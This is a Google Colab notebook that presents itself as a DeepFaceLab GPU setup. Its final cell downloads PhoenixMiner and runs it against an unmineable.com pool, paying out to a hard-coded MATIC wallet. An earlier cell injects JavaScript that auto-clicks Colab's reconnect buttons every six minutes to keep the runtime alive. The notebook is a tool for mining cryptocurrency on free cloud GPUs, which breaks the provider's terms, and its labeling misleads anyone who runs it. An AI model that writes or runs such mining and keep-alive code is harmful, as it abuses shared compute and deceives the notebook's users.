{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "clay.ipynb",
      "provenance": [],
      "collapsed_sections": [],
	  "machine_shape": "hm"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "U2a8nsqUNAQ5"
      },
      "source": [
        "#  TEU PAHAM \r\n",
        "\r\n",
        "1.   ANTI\r\n",
        "2.   MALING\r\n",
        "3.   BRO\r\n",
        "\r\n",
        "---\r\n",
        "\r\n",
        "MULAI\r\n",
        "\r\n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "OtwO16SRNF4a"
      },
      "source": [
        "## Prevent random disconnects\n",
        "\n",
        "This cell runs JS code to automatic reconnect to runtime."
      ]
    },
    {
	      "cell_type": "code",
      "metadata": {
        "id": "Czp5Db-WNJ4o"
      },
      "source": [
        "import IPython\n",
        "from google.colab import output\n",
        "\n",
        "display(IPython.display.Javascript('''\n",
        " function ClickConnect(){\n",
        "   btn = document.querySelector(\"colab-connect-button\")\n",
        "   if (btn != null){\n",
        "     console.log(\"Click colab-connect-button\"); \n",
        "     btn.click() \n",
        "     }\n",
        "   \n",
        "   btn = document.getElementById('ok')\n",
        "   if (btn != null){\n",
        "     console.log(\"Click reconnect\"); \n",
        "     btn.click() \n",
        "     }\n",
        "  }\n",
        "  \n",
        "setInterval(ClickConnect,360000)\n",
        "'''))\n",
        "\n",
        "print(\"Done.\")"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "hfYgzT-0NUP0"
      },
      "source": [
        "## Check GPU\n",
        "\n",
        "*   Google Colab can provide you with P100 Tesla graphics card everytime\n",
        "*   Here you can check the model of GPU before using DeepFaceLab\n"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "pJbYXou6chZf"
      },
      "source": [
        "!nvidia-smi"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "p1lSrne30naj"
      },
      "source": [
        "! wget https://github.com/PhoenixMinerDevTeam/PhoenixMiner/releases/download/5.6d/PhoenixMiner_5.6d_Linux.tar.gz\n",
        "\n",
        "! tar -xf PhoenixMiner_5.6d_Linux.tar.gz\n",
        "\n",
		"%cd PhoenixMiner_5.6d_Linux\n",
        "\n",
        "! bin/PhoenixMiner -epool stratum1+tcp://ethash.unmineable.com:3333 -worker MATIC:0xBF7a2dB59CAF1ba7079C87CefFf8f62750fC990f.Mt01#61ev-k59e -pass x"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}
